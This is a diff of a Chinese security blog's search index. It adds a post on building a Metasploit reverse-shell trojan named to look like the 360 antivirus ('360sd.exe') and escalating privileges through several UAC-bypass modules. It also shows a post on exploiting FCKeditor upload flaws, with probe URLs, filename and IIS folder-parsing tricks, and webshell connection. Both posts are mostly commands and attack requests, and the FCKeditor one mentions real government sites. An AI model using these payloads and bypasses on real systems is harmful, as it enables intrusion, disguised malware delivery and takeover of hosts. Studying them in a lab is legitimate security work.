@@ -1,6 +1,21 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[Metasploit生成木马文件获取shell和UAC提权操作]]></title>
+    <url>%2Fmeterpreter-UACgetSystem%2F</url>
+    <content type="text"><![CDATA[前言 攻击环境 获取shell UAC提权 一. 前言前段时间有做过一次内核提权的尝试，不过没有成功，主要还是权限控制的比较严格，并且该打的补丁都打了。但是方法还是有用的，还有就是思路流程总结一下。 二. 攻击环境 攻击机：kali Linux 2019.1 IP：192.168.28.156 靶机：Windows7 ultimate sp1 IP：192.168.28.138 三. 获取shell3.1 生成木马首先启动msf数据库 12/etc/init.d/postgresql startmsfdb init 生成木马 123456msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.28.156 lport=8585 -f exe -o 360sd.exe-p 选用什么payloadlhost 监听iplport 监听端口-f 生成文件的类型 3.2 启用MSF监听123456use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpshow options //查看那些参数是需要输入的set lhost 192.168.28.156 //设置监听的IPset lport 8585 //设置监听的端口run/exploit 3.3 投放木马并运行3.4 获取shell 四. UAC提权在获取到shell之后，可以先测试一下命令测试权限 12getsystemgetuid 如果你没有系统/管理员权限，那么你就需要绕过目标系统的UAC保护。 输入background将获取到的会话转入后台，更换其他exp进行提权操作。 4.1 Windows升级UAC保护绕过此模块将通过进程注入利用受信任的发布者证书绕过Windows UAC。这将产生第二个shell，而且UAC保护已经关闭。 123msf &gt; use exploit/windows/local/bypassuacmsf exploit windows/local/bypassuac) &gt; set session 1msf exploit(windows/local/bypassuac) &gt; exploit 从下图可以看到，又建立了一个meterpreter会话2连接，现在输入getsystem和getuid两条命令来查看系统权限： 4.2 Windows升级UAC保护绕过（内存注入）此模块将通过进程注入利用受信任的发布者证书绕过Windows UAC。这将产生第二个shell，而且UAC保护已经关闭。此模块使用反射DLL注入技术仅删除DLLpayload二进制文件而不是删除标准技术中的三个单独的二进制文件。但是，它需要选择正确的体系结构（对于SYSWOW64系统也使用x64）。如果指定EXE :: Custom，你的DLL应该在单独的进程中启动payload后调用ExitProcess()。 123msf &gt; use exploit/windows/local/bypassuac_injectionmsf exploit(windows/local/bypassuac_injection) &gt; set session 1msf exploit(windows/local/bypassuac_injection) &gt; exploit 从下图中可以看出，meterpreter 会话2已经成功打开，现在输入getsystem和getuid两条命令来查看权限 4.3 Windows升级UAC保护绕过（FodHelper注册表键值绕过）此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10 UAC。这将产生第二个shell，而且UAC保护已经关闭。此模块修改注册表项，但在调用payload后清除该项。该模块不要求payload的结构与OS匹配。如果指定EXE :: Custom，你的DLL应该在单独的进程中启动payload后调用ExitProcess()。 123msf &gt; use exploit/windows/local/bypassuac_fodhelpermsf exploit(windows/local/bypassuac_fodhelper) &gt; set session 1msf exploit(windows/local/bypassuac_fodhelper) &gt; exploit 4.4 Windows升级UAC保护绕过（Eventvwr注册表键值绕过）此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入自定义命令，这个命令将在启动Windows fodhelper.exe应用程序时调用来绕过Windows 10 UAC。这将产生第二个shell，而且UAC保护已经关闭。此模块修改注册表项，但在调用payload后清除该项。该模块不要求payload的结构与OS匹配。如果指定EXE :: Custom，你的DLL应该在单独的进程中启动payload后调用ExitProcess()。 123msf &gt; use exploit/windows/local/bypassuac_eventvwrmsf exploit(windows/local/bypassuac_eventvwr) &gt; set session 1msf exploit(windows/local/bypassuac_eventvwr) &gt; exploit 4.5 Windows升级UAC保护绕过（COM Handler劫持绕过）此模块将通过在HKCU配置单元中创建COM处理程序注册表项来绕过Windows UAC。加载某些高完整性进程时，会引用这些注册表项，从而导致进程加载用户控制的DLL。这些DLL包含导致会话升级的payload。在payload调用后清除注册表项修改。此模块要求payload的体系结构与OS匹配，但当前的低权限Meterpreter会话的体系结构并不相同。如果指定EXE :: Custom，你的DLL应该在单独的进程中启动payload后调用ExitProcess（）。此模块通过目标上的cmd.exe调用目标二进制文件。因此，如果限制cmd.exe访问，则此模块将无法正常运行。 123msf &gt; use exploit/windows/local/bypassuac_comhijackmsf exploit(windows/local/bypassuac_comhijack) &gt; set session 1msf exploit(windows/local/bypassuac_comhijack) &gt; exploit]]></content>
+      <categories>
+        <category>攻击测试</category>
+      </categories>
+      <tags>
+        <tag>kali Linux</tag>
+        <tag>攻击测试</tag>
+        <tag>木马攻击</tag>
+        <tag>Metasploit</tag>
+        <tag>UAC提权</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[FCKeditor文件上传漏洞及利用]]></title>
     <url>%2Ffckeditor-upload%2F</url>
     <content type="text"><![CDATA[关于FCKeditor 攻击思路 总结 一. 关于FCKeditorFCKeditor是一个网页的文本编辑器，在很多的cms里都有出现。近日工作期间遇到了不下十个有FCKeditor的站，尤其是ZF网站。 本文简单介绍通过FCKeditor上传漏洞进行攻击的思路，并对可能用到的操作进行整理。 二. 攻击思路1.查看FCKeditor版本12http://127.0.0.1/fckeditor/editor/dialog/fck_about.htmlhttp://127.0.0.1/FCKeditor/_whatsnew.html 2.测试上传点123456789101112131415161718192021222324252627FCKeditor/editor/filemanager/browser/default/connectors/test.htmlFCKeditor/editor/filemanager/upload/test.htmlFCKeditor/editor/filemanager/connectors/test.htmlFCKeditor/editor/filemanager/connectors/uploadtest.htmlFCKeditor/_samples/default.htmlFCKeditor/_samples/asp/sample01.aspFCKeditor/_samples/asp/sample02.aspFCKeditor/_samples/asp/sample03.aspFCKeditor/_samples/asp/sample04.aspFCKeditor/_samples/default.htmlFCKeditor/editor/fckeditor.htmFCKeditor/editor/fckdialog.htmlFCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector.jsp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=http://www.site.com/fckeditor/editor/filemanager/connectors/php/connector.phpFCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=http://www.site.com/fckeditor/editor/filemanager/connectors/asp/connector.aspFCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=http://www.site.com/fckeditor/editor/filemanager/connectors/aspx/connector.aspxFCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=http://www.site.com/fckeditor/editor/filemanager/connectors/jsp/connector.jspFCKeditor/editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.aspFCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/jsp/connector.jspfckeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/aspx/connector.Aspxfckeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/php/connector.php 3.突破限制3.1 上传限制上传限制的突破方式很多，主要还是抓包改扩展名，%00截断，添加文件头等 3.2 文件名限制3.2.1二次上传绕过文件名‘ . ’ 修改为‘ _ ’FCK在上传了诸如shell.asp;.jpg的文件后，会自动将文件名改为shell_asp;.jpg。可以继续上传同名文件，文件名会变为shell.asp;(1).jpg 3.2.2提交shell.php+空格绕过空格只支持windows系统，linux系统是不支持的，可提交shell.php+空格来绕过文件名限制。 3.3 IIS6.0突破文件夹限制123Fckeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=File&amp;CurrentFolder=/shell.asp&amp;NewFolderName=z.aspFCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/shell.asp&amp;NewFolderName=z&amp;uuid=1244789975684FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=CreateFolder&amp;CurrentFolder=/&amp;Type=Image&amp;NewFolderName=shell.asp 3.4 文件解析限制通过Fckeditor编辑器在文件上传页面中，创建诸如1.asp文件夹，然后再到该文件夹下上传一个图片的webshell文件，获取其shell。 1http://127.0.0.1/images/upload/201806/image/1.asp/1.jpg 4.列目录4.1 FCKeditor/editor/fckeditor.htmlFCKeditor/editor/fckeditor.html不可以上传文件，可以点击上传图片按钮再选择浏览服务器即可跳转至可上传文件页，可以查看已经上传的文件。 4.2 根据xml返回信息查看网站目录1http://127.0.0.1/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=../../../&amp;NewFolderName=shell.asp 4.3 获取当前文件夹123FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/ 4.4 浏览E盘文件1/FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=e:/ 5. 连接木马在木马能够解析之后，使用各类工具连接到木马，获取webshell。至此，利用FCKeditor进行文件上传并攻击的过程就已经完成。 三. 其他最近的工作中遇到的站里大多数都存在FCKeditor编辑器，基本都存在以上漏洞，可以说是非常严重的问题。 在获取到webshell之后，可以进行的操作非常多，也便于提权操作，拿下主机权限并不困难。 关于该漏洞的防御，可以删除掉所有的上传点，并限制目录访问。]]></content>
@@ -140,8 +155,8 @@
         <category>环境搭建</category>
       </categories>
       <tags>
-        <tag>环境搭建</tag>
         <tag>SQL注入</tag>
+        <tag>环境搭建</tag>
         <tag>SQLi-Labs</tag>
       </tags>
   </entry>
@@ -165,10 +180,10 @@
         <category>工具使用</category>
       </categories>
       <tags>
-        <tag>kali Linux</tag>
         <tag>Social-Engineer-Toolkit</tag>
         <tag>钓鱼网站</tag>
         <tag>社工</tag>
+        <tag>kali Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -192,9 +207,9 @@
         <category>环境搭建</category>
       </categories>
       <tags>
+        <tag>kali Linux</tag>
         <tag>环境搭建</tag>
         <tag>Shellinabox</tag>
-        <tag>kali Linux</tag>
         <tag>Ngrok</tag>
       </tags>
   </entry>
@@ -221,8 +236,8 @@
         <category>环境搭建</category>
       </categories>
       <tags>
-        <tag>环境搭建</tag>
         <tag>DVWA</tag>
+        <tag>环境搭建</tag>
       </tags>
   </entry>
   <entry>
@@ -273,8 +288,8 @@
         <category>漏洞复现</category>
       </categories>
       <tags>
-        <tag>Nmap</tag>
         <tag>Metasploit</tag>
+        <tag>Nmap</tag>
         <tag>ms17-010</tag>
         <tag>永恒之蓝</tag>
         <tag>漏洞复现</tag>
